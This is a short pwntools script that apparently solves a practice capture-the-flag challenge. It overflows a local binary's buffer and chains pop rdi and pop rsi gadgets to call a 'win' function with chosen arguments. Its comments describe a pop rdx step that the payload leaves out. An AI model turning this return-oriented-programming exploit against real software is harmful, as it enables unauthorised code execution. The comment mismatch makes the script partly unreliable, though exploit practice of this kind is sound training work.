from pwn import *

# setup process
p = process("./kid_ROP_bin")
context.binary = "./kid_ROP_bin"

# address of win function
win_addr = p64(0x400537)

# ROP gadget addresses
rdi_addr = p64(0x400603)
rsi_addr = p64(0x400601)

# payload = 
# padding
# pop rdi + argument 1
# pop rsi + argument 2 + pop r15 (we dont need r15)
# pop rdx + argument 3
# return to win

payload = b'A' * 40
payload += rdi_addr + p64(0x1337)
payload += rsi_addr + p64(0xdead) + p64(0)
payload += win_addr 

# send payload
p.sendline(payload)
p.interactive()